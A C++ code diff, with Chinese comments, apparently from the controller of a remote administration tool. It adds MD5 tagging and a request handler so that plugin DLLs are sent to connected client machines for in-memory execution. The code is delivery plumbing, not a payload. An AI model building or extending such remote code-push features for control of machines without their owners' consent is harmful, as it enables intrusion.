@@ -223,11 +223,13 @@ DllInfo* ReadPluginDll(const std::string& filename) {
 	}
 
 	// 设置输出参数
+	auto md5 = CalcMD5FromBytes(buffer + 1 + sizeof(DllExecuteInfo), fileSize);
 	DllExecuteInfo info = { MEMORYDLL, fileSize, CALLTYPE_IOCPTHREAD, };
 	memcpy(info.Name, name.c_str(), name.length());
+	memcpy(info.Md5, md5.c_str(), md5.length());
 	buffer[0] = CMD_EXECUTE_DLL;
 	memcpy(buffer + 1, &info, sizeof(DllExecuteInfo));
-	Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfo) + fileSize);
+	Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfo) + fileSize, 0, md5);
 	SAFE_DELETE_ARRAY(buffer);
 	return new DllInfo{ name, buf };
 }
@@ -1639,6 +1641,17 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 	}
 	switch (ContextObject->InDeCompressedBuffer.GetBYTE(0))
 	{
+	case CMD_EXECUTE_DLL: // 请求DLL
+	{
+		DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
+		for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i){
+			DllInfo* dll = *i;
+			if (dll->Name == info->Name) {
+				return m_iocpServer->OnClientPreSending(ContextObject, dll->Data->Buf(), dll->Data->length());
+			}
+		}
+		break;
+	}
 	case COMMAND_PROXY:
 	{
 		g_2015RemoteDlg->SendMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)ContextObject);
@@ -2625,7 +2638,7 @@ void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID) {
 		Buffer* buf = m_DllList[menuIndex]->Data;
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
 		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
-		m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), buf->length());
+		m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), 1 + sizeof(DllExecuteInfo));
 	}
 	LeaveCriticalSection(&m_cs);
 }
